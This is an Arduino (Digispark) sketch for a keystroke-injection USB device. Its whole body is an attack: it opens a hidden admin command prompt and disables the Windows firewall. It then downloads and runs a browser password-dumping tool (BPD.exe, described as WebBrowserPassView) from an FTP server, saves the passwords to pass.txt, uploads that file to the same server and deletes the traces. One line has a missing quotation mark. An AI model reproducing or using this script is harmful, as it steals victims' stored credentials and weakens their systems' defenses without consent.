#include <Arduino.h> //Remove this if using Arduino IDE
#include <explo1t.h>
#include "DigiKeyboard.h"
#define KEY_TAB 43


void setup()
{
    pinMode(1, OUTPUT);            // Declare LED
    DigiKeyboard.delay(5000);      // Make sure the system is ready
    digitalWrite(1, HIGH);         // Turn LED On
    DigiKeyboard.sendKeyStroke(0); // Commenting this line can cause issues on some systems
    openCMD();                     // Opens CMD
    hideWindow();                  // Hides the current Window

    //At this Point CMD is open with Admin rights and it will hidden below taskbar
    printThis("mkdir C:\\123", 1000);
    printThis("netsh advfirewall set allprofiles state off", 2000);
    printThis("cd C://123", 1000);
    printThis("ftp", 2000);
    printThis("open ftp.drivehq.com", 3000);
    printThis("USERNAME", 2000);
    printThis("USERNAME", 2000);
    printThis("get BPD.exe", 7000);
    printThis("close", 1000);
    printThis("quit", 1000);
    printThis("BPD.exe", 1000);
    hideWindow(); // Hide the WebBrowserPassView GUI, The Commandline version can also work but it didn't in my case

    pressThis(KEY_A, MOD_CONTROL_LEFT);
    sleep(100);
    pressThis(KEY_S, MOD_CONTROL_LEFT);
    sleep(1000);
    tap(KEY_TAB, 5);
    sleep(100);
    pressThis(KEY_ENTER);
    sleep(100);
    printThis("C:/123", 500);
    tap(KEY_TAB, 6);
    printThis("pass", 500);
    pressThis(KEY_F4, MOD_ALT_LEFT);
    printThis("del BPD.exe", 500);
    printThis("ftp", 500);
    printThis("open ftp.drivehq.com", 500);
    printThis("USERNAME, 2000);
    printThis("PASSWORD", 2000);
    printThis("send pass.txt", 6000);
    printThis("close", 200);
    printThis("quit", 200);
    printThis("cd c:/", 300);
    printThis("rmdir C:\\123 /s", 1000);
    printThis("y", 400);
    printThis("exit", 0);
}

void loop()
{
    digitalWrite(1, LOW);  // turn the LED off
    delay(100);            // wait for 1/10 second
    digitalWrite(1, HIGH); // turn the LED on
    delay(100);
}
